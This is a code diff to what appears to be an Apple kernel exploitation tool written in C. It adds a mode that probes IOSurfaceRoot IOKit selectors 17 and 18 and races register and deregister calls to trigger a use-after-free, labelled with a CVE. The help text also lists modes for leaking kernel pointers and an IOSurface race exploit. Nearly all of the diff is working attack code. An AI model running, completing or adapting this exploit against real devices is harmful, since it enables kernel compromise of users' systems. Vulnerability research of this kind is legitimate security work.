@@ -40,6 +40,7 @@
 #include <pthread.h>
 #include <dispatch/dispatch.h>
 #include <mach/mach.h>
+#include <mach/mach_time.h>
 #include <CoreFoundation/CoreFoundation.h>
 #include <VideoToolbox/VideoToolbox.h>
 #include <CoreVideo/CoreVideo.h>
@@ -54,6 +55,7 @@
 #include <fcntl.h>
 #include <errno.h>
 #include <compression.h>
+#include <stdatomic.h>
 
 extern int csops(pid_t pid, unsigned int ops, void *useraddr, size_t usersize);
 extern int proc_pidinfo(int pid, int flavor, uint64_t arg, void *buffer, int buffersize);
@@ -14171,7 +14173,8 @@ vps_cd_done:
 
     } else if (strcmp(mode, "sysctl_leak") == 0 || strcmp(mode, "ave_prop_scan") == 0 ||
                strcmp(mode, "state_leak") == 0 || strcmp(mode, "registry_leak") == 0 ||
-               strcmp(mode, "task_leak") == 0 || strcmp(mode, "iosurface_race") == 0) {
+               strcmp(mode, "task_leak") == 0 || strcmp(mode, "iosurface_race") == 0 ||
+               strcmp(mode, "iosurface_sel17") == 0) {
         goto new_modes;
 
     } else {
@@ -14237,6 +14240,7 @@ vps_cd_done:
         rlog("  registry_leak [phase]              -- KEY: IORegistry property + CMSampleBuffer KPTR scan\n");
         rlog("  task_leak [phase]                  -- KEY: Mach task/thread/host info + compression leak\n");
         rlog("  iosurface_race [rounds] [threads]   -- KEY: CVE-112477 IOSurface race condition exploit\n");
+        rlog("  iosurface_sel17 [rounds]            -- KEY: CVE-112477 sel17/18 registry UAF trigger\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
@@ -16658,6 +16662,282 @@ new_modes:
         CFRelease(pf);
 
         rlog("\n=== IOSURFACE_RACE complete. Total KPTR/anomaly: %d ===\n", kptr_found);
+
+    } else if (strcmp(mode, "iosurface_sel17") == 0) {
+        /*
+         * iosurface_sel17 — CVE-2026-112477 raw IOKit selector 17/18 race
+         *
+         * Selector 17 (register): async, 24-byte struct input, needs wake port
+         * Selector 18 (deregister): sync, 24-byte struct input
+         * Race: register → deregister → re-register to create stale entry
+         */
+        int rounds = (argc > 2) ? atoi(argv[2]) : 100;
+        if (rounds < 1) rounds = 1;
+
+        rlog("=== IOSURFACE_SEL17: Raw selector 17/18 registry race ===\n");
+        rlog("rounds=%d\n\n", rounds);
+
+        /* Open IOSurfaceRoot user client */
+        io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("IOSurfaceRoot"));
+        if (!service) {
+            rlog("ERROR: IOSurfaceRoot not found\n");
+            goto done;
+        }
+        rlog("  IOSurfaceRoot service: 0x%x\n", service);
+
+        io_connect_t conn = 0;
+        kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
+        IOObjectRelease(service);
+        if (kr != KERN_SUCCESS) {
+            rlog("ERROR: IOServiceOpen failed: 0x%x\n", kr);
+            goto done;
+        }
+        rlog("  Connection: 0x%x\n", conn);
+
+        /* Create a test IOSurface to get a valid surface ID */
+        int w_val = 64, h_val = 64, bpe_val = 4, pf_val = 0x42475241;
+        CFNumberRef w_n = CFNumberCreate(NULL, kCFNumberIntType, &w_val);
+        CFNumberRef h_n = CFNumberCreate(NULL, kCFNumberIntType, &h_val);
+        CFNumberRef bpe_n = CFNumberCreate(NULL, kCFNumberIntType, &bpe_val);
+        CFNumberRef pf_n = CFNumberCreate(NULL, kCFNumberIntType, &pf_val);
+        CFStringRef k[] = {
+            CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+            CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat")
+        };
+        CFTypeRef v[] = { w_n, h_n, bpe_n, pf_n };
+        CFDictionaryRef sprops = CFDictionaryCreate(NULL,
+            (const void **)k, (const void **)v, 4,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        IOSurfaceRef test_surf = IOSurfaceCreate(sprops);
+        uint32_t surf_id = test_surf ? IOSurfaceGetID(test_surf) : 0;
+        rlog("  Test surface ID: %u\n", surf_id);
+        CFRelease(sprops);
+        CFRelease(w_n); CFRelease(h_n); CFRelease(bpe_n); CFRelease(pf_n);
+
+        /* Phase 1: Calibrate — try selector 17 with various input sizes */
+        rlog("\n--- Phase 1: Calibrate selector 17/18 input format ---\n");
+
+        /* Try different struct sizes to find what selector 17 accepts */
+        for (int sz = 0; sz <= 64; sz += 4) {
+            uint8_t input[64];
+            memset(input, 0, sizeof(input));
+            /* Put surface ID at offset 0 */
+            if (surf_id && sz >= 4) {
+                memcpy(input, &surf_id, 4);
+            }
+
+            uint8_t output[256];
+            uint32_t out_sz = sizeof(output);
+            memset(output, 0xBB, sizeof(output));
+
+            /* Try sync first to see what size is accepted */
+            kr = IOConnectCallStructMethod(conn, 17, input, sz, output, (size_t*)&out_sz);
+            const char *name = "?";
+            if (kr == 0) name = "OK";
+            else if (kr == 0xE00002C2) name = "BadArg";
+            else if (kr == 0xE00002C9) name = "DupReg";
+            else if (kr == 0xE00002D8) name = "NotAttached";
+            else if (kr == 0xE00002BC) name = "NotPermitted";
+
+            if (kr != 0xE00002C2 || sz <= 32) {
+                rlog("  sel17 sync sz=%2d: 0x%08x (%s) out_sz=%u\n", sz, kr, name, out_sz);
+            }
+
+            /* If we got an interesting response, dump output */
+            if (kr == 0 && out_sz > 0) {
+                rlog("    output:");
+                for (uint32_t oi = 0; oi < out_sz && oi < 64; oi++)
+                    rlog("%02x", output[oi]);
+                rlog("\n");
+            }
+
+            /* Also try selector 18 with same size */
+            out_sz = sizeof(output);
+            memset(output, 0xBB, sizeof(output));
+            kr = IOConnectCallStructMethod(conn, 18, input, sz, output, (size_t*)&out_sz);
+            name = "?";
+            if (kr == 0) name = "OK";
+            else if (kr == 0xE00002C2) name = "BadArg";
+            else if (kr == 0xE00002C9) name = "DupReg";
+            else if (kr == 0xE00002D8) name = "NotAttached";
+            else if (kr == 0xE00002BC) name = "NotPermitted";
+
+            if (kr != 0xE00002C2 || sz <= 32) {
+                rlog("  sel18 sync sz=%2d: 0x%08x (%s) out_sz=%u\n", sz, kr, name, out_sz);
+            }
+        }
+
+        /* Phase 2: Try async call to selector 17 */
+        rlog("\n--- Phase 2: Async selector 17 (IOConnectCallAsyncMethod) ---\n");
+
+        /* Create a wake port for async notification */
+        mach_port_t wake_port = MACH_PORT_NULL;
+        kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wake_port);
+        if (kr != KERN_SUCCESS) {
+            rlog("  mach_port_allocate failed: 0x%x\n", kr);
+        } else {
+            kr = mach_port_insert_right(mach_task_self(), wake_port, wake_port,
+                MACH_MSG_TYPE_MAKE_SEND);
+            rlog("  Wake port: 0x%x (insert_right: 0x%x)\n", wake_port, kr);
+        }
+
+        if (wake_port != MACH_PORT_NULL) {
+            /* Try async sel17 with 24-byte input */
+            uint64_t reference[1] = {0x41414141};
+
+            for (int sz = 8; sz <= 32; sz += 4) {
+                uint8_t input[32];
+                memset(input, 0, sizeof(input));
+                if (surf_id) memcpy(input, &surf_id, 4);
+
+                kr = IOConnectCallAsyncStructMethod(conn, 17,
+                    wake_port, reference, 1,
+                    input, sz, NULL, NULL);
+
+                const char *name = "?";
+                if (kr == 0) name = "OK";
+                else if (kr == 0xE00002C2) name = "BadArg";
+                else if (kr == 0xE00002C9) name = "DupReg";
+                else if (kr == 0xE00002D8) name = "NotAttached";
+                else if (kr == 0xE00002BC) name = "NotPermitted";
+
+                rlog("  async sel17 sz=%2d: 0x%08x (%s)\n", sz, kr, name);
+
+                /* If registered, try to deregister before next attempt */
+                if (kr == 0) {
+                    kern_return_t kr2 = IOConnectCallStructMethod(conn, 18,
+                        input, sz, NULL, NULL);
+                    rlog("    -> dereg sel18 sz=%d: 0x%08x\n", sz, kr2);
+                }
+            }
+
+            /* Phase 3: Try scalar method format for sel17/18 */
+            rlog("\n--- Phase 3: Scalar method format for sel17/18 ---\n");
+
+            for (int ninp = 0; ninp <= 4; ninp++) {
+                uint64_t scalars[4] = {surf_id, 0, 0, 0};
+                uint32_t out_cnt = 4;
+                uint64_t out_scalars[4] = {0};
+
+                kr = IOConnectCallScalarMethod(conn, 17, scalars, ninp,
+                    out_scalars, &out_cnt);
+                const char *name = "?";
+                if (kr == 0) name = "OK";
+                else if (kr == 0xE00002C2) name = "BadArg";
+                else if (kr == 0xE00002C9) name = "DupReg";
+                else if (kr == 0xE00002D8) name = "NotAttached";
+                rlog("  scalar sel17 ninp=%d: 0x%08x (%s) outc=%u\n",
+                     ninp, kr, name, out_cnt);
+
+                if (kr == 0) {
+                    rlog("    out:");
+                    for (uint32_t oi = 0; oi < out_cnt; oi++)
+                        rlog(" 0x%llx", out_scalars[oi]);
+                    rlog("\n");
+                    /* Deregister */
+                    IOConnectCallScalarMethod(conn, 18, scalars, ninp, NULL, NULL);
+                }
+            }
+
+            /* Phase 4: If we found a working format, race it */
+            rlog("\n--- Phase 4: Race register/deregister (if format found) ---\n");
+
+            /* Try the most likely format: async struct 24 bytes */
+            uint8_t reg_input[24];
+            memset(reg_input, 0, sizeof(reg_input));
+            if (surf_id) memcpy(reg_input, &surf_id, 4);
+
+            kr = IOConnectCallAsyncStructMethod(conn, 17,
+                wake_port, reference, 1,
+                reg_input, 24, NULL, NULL);
+            rlog("  Initial register (async 24B): 0x%08x\n", kr);
+
+            if (kr == 0) {
+                /* Deregister */
+                kr = IOConnectCallStructMethod(conn, 18, reg_input, 24, NULL, NULL);
+                rlog("  Deregister: 0x%08x\n", kr);
+
+                /* Now race: concurrent register/deregister */
+                rlog("  Racing %d rounds...\n", rounds);
+
+                __block _Atomic int race_ok = 0;
+                __block _Atomic int race_dup = 0;
+                __block _Atomic int race_notattach = 0;
+                __block _Atomic int race_other = 0;
+                __block _Atomic int stale_hits = 0;
+                __block _Atomic int r_stop = 0;
+                __block int r_rounds = rounds;
+                __block io_connect_t r_conn = conn;
+                __block mach_port_t r_port = wake_port;
+
+                dispatch_queue_t reg_q = dispatch_queue_create("reg", NULL);
+                dispatch_queue_t dereg_q = dispatch_queue_create("dereg", NULL);
+
+                dispatch_async(reg_q, ^{
+                    uint8_t inp[24];
+                    memset(inp, 0, 24);
+                    memcpy(inp, &surf_id, 4);
+                    uint64_t ref[1] = {0x42424242};
+
+                    for (int i = 0; i < r_rounds && !r_stop; i++) {
+                        kern_return_t rk = IOConnectCallAsyncStructMethod(r_conn, 17,
+                            r_port, ref, 1, inp, 24, NULL, NULL);
+                        if (rk == 0) race_ok++;
+                        else if (rk == 0xE00002C9) race_dup++;
+                        else if (rk == 0xE00002D8) race_notattach++;
+                        else race_other++;
+                    }
+                    r_stop = 1;
+                });
+
+                dispatch_async(dereg_q, ^{
+                    uint8_t inp[24];
+                    memset(inp, 0, 24);
+                    memcpy(inp, &surf_id, 4);
+
+                    while (!r_stop) {
+                        kern_return_t rk = IOConnectCallStructMethod(r_conn, 18,
+                            inp, 24, NULL, NULL);
+                        if (rk == 0) race_ok++;
+                        else if (rk == 0xE00002C9) race_dup++;
+                        else if (rk == 0xE00002D8) {
+                            race_notattach++;
+                            /* NotAttached after register = possible stale */
+                            stale_hits++;
+                        }
+                        else race_other++;
+                    }
+                });
+
+                dispatch_sync(reg_q, ^{});
+                usleep(50000);
+
+                rlog("  Race results: ok=%d dup=%d notattach=%d other=%d stale=%d\n",
+                     race_ok, race_dup, race_notattach, race_other, stale_hits);
+            } else {
+                rlog("  Register failed, trying other formats...\n");
+
+                /* Try all selectors with scalar inputs to find the right one */
+                for (int sel = 15; sel <= 20; sel++) {
+                    for (int ninp = 1; ninp <= 3; ninp++) {
+                        uint64_t scalars[3] = {surf_id, 0, 0};
+                        kr = IOConnectCallScalarMethod(conn, sel, scalars, ninp,
+                            NULL, NULL);
+                        if (kr != 0xE00002C2) {
+                            rlog("  sel=%d scalar ninp=%d: 0x%08x\n", sel, ninp, kr);
+                        }
+                    }
+                }
+            }
+
+            mach_port_deallocate(mach_task_self(), wake_port);
+        }
+
+        if (test_surf) CFRelease(test_surf);
+        IOServiceClose(conn);
+
+        rlog("\n=== IOSURFACE_SEL17 complete ===\n");
     }
 
 done:
